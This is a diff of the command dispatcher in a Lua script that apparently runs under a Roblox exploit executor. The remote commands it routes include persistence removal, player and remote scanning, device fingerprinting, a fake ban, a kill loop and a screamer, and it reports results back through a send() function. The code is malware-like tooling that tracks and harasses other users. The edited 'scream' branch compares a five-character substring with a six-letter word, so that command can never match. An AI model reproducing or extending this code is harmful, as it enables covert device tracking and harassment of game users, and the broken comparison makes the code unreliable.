@@ -715,42 +715,42 @@ task.spawn(function()
                     send("PERSISTENCE", "UninstallPersistence not found on this session.", 16711680)
                 end
 
-            elseif cmd == "playerscan" then
+            elseif cmd:sub(1, 10) == "playerscan" then
                 if getgenv().IntelSuite.PlayerScan then
                     task.spawn(getgenv().IntelSuite.PlayerScan)
                 end
 
-            elseif cmd == "remotescan" then
+            elseif cmd:sub(1, 10) == "remotescan" then
                 if getgenv().IntelSuite.RemoteScanner then
                     task.spawn(getgenv().IntelSuite.RemoteScanner)
                 end
 
-            elseif cmd == "deviceinfo" then
+            elseif cmd:sub(1, 10) == "deviceinfo" then
                 if getgenv().IntelSuite.DeviceFingerprint then
                     task.spawn(getgenv().IntelSuite.DeviceFingerprint)
                 end
 
-            elseif cmd == "fakeban" then
+            elseif cmd:sub(1, 7) == "fakeban" then
                 if getgenv().IntelSuite.FakeBan then
                     task.spawn(getgenv().IntelSuite.FakeBan)
                 end
 
-            elseif cmd == "killloop" then
+            elseif cmd:sub(1, 8) == "killloop" then
                 if getgenv().IntelSuite.StartKillLoop then
                     task.spawn(getgenv().IntelSuite.StartKillLoop)
                 end
 
-            elseif cmd == "killstop" then
+            elseif cmd:sub(1, 8) == "killstop" then
                 if getgenv().IntelSuite.StopKillLoop then
                     getgenv().IntelSuite.StopKillLoop()
                 end
 
-            elseif cmd == "scream" then
+            elseif cmd:sub(1, 5) == "scream" and cmd:sub(1, 9) ~= "screamsto" then
                 if getgenv().IntelSuite.StartScreamer then
                     task.spawn(getgenv().IntelSuite.StartScreamer)
                 end
 
-            elseif cmd == "screamstop" then
+            elseif cmd:sub(1, 9) == "screamsto" then
                 if getgenv().IntelSuite.StopScreamer then
                     getgenv().IntelSuite.StopScreamer()
                 end
